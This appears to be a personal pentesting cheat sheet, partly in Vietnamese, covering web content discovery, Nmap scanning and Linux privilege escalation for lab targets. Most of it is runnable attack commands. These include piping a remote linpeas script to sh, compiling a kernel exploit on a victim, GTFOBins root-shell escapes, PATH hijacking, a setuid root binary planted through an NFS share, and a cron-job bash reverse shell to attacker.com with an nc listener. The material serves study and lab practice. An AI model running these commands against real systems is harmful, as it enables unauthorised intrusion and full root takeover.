
                        Web Hacking
                        
                        
Walking An Application

    View Source - Use your browser to view the human-readable source code of a website.
    Inspector - Learn how to inspect page elements and make changes to view usually blocked content.
    Debugger - Inspect and control the flow of a page's JavaScript
    Network - See all the network requests a page makes.
    
Content Discovery

    robots.txt
    favicon
        e.g. curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
    sitemap.xml
    HTTP Headers
    Framework Stack (tìm framework gốc)
    OSINT Wayback Machine: https://archive.org/web/
    
Automated Discovery

    dirb http://10.10.10.10/ /usr/share/SecLists/Discovery/Web-Content/common.txt
(*) dirsearch -u http://10.10.10.10/
(*) dirsearch -u http://10.10.10.10/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt
    gobuster dir -u http://10.10.10.10/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt

    FORENSIC
(*) exiftool DOCUMENT.pdf

Network Security
    DNSDumpster: https://dnsdumpster.com/
    * Nmap
(*) nmap -Pn 10.10.10.10
(*) nmap -sV 10.10.10.10

Linux PrivEsc
    * Enumeration
    hostname
(*) hostnamectl
(*) uname -a
(*) cat /proc/version
    cat /etc/issue
(*) ls -la
(*) sudo -l
(*) find / -perm -u=s -type f 2> /dev/null

    * Automated Enumeration Tools
(*) LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
        curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
    LinEnum: https://github.com/rebootuser/LinEnum
    LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
    Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
    Linux Priv Checker: https://github.com/linted/linuxprivchecker

    * Privilege Escalation: Kernel Exploits
    // search
(*) searchsploit "linux kernel 3.13"
(*) searchsploit -m 37292.c
    // send script to victim
(*) python3 -m http.server
(*) send through SFTP using WinSCP
    // exec
    gcc 37292.c && ./a.out
    
    * Privilege Escalation: Sudo
(*) sudo -l
(*) https://gtfobins.github.io/
        sudo find . -exec /bin/sh \; -quit
    
    * Privilege Escalation: SUID
(*) find / -perm -u=s -type f 2> /dev/null
(*) https://gtfobins.github.io/
        LFILE=file_to_read
        base64 "$LFILE" | base64 --decode
    
    * Privilege Escalation: Capabilities
(*) getcap -r / 2> /dev/null
(*) https://gtfobins.github.io/
        ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
    
    * Privilege Escalation: Cron Jobs
(*) cat /etc/crontab
(*) https://gtfobins.github.io/
    vim backup.sh
        export RHOST=attacker.com
        export RPORT=12345
        bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
    chmod 777 backup.sh
    // attacker
(*) nc -lvnp 12345
    
    * Privilege Escalation: PATH
    find / -writable 2> /dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
(*) find / -perm -u=s -type f 2> /dev/null
    export PATH=/tmp:$PATH
    echo $PATH
    cd /tmp
    echo "/bin/bash"> path
    chmod 777 path
    path (mấu chốt là tìm cách thực thi với SUID để leo thang đặc quyền)
    
    * Privilege Escalation: NFS
    // victim
(*) cat /etc/exports
        /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
    // attacker
(*) showmount -e 10.10.10.10
    mkdir tmp
(*) mount -o rw 10.10.10.10:/tmp tmp
    cd tmp
(*) vim nfs.c
        int main()
        {
            setgid(0);
            setuid(0);
            system("/bin/bash");
            return 0;
        }
(*) gcc nfs.c -o nfs -w
(*) chmod +s nfs
    // victim
(*) ./nfs
        
    
    
    
    
    
    

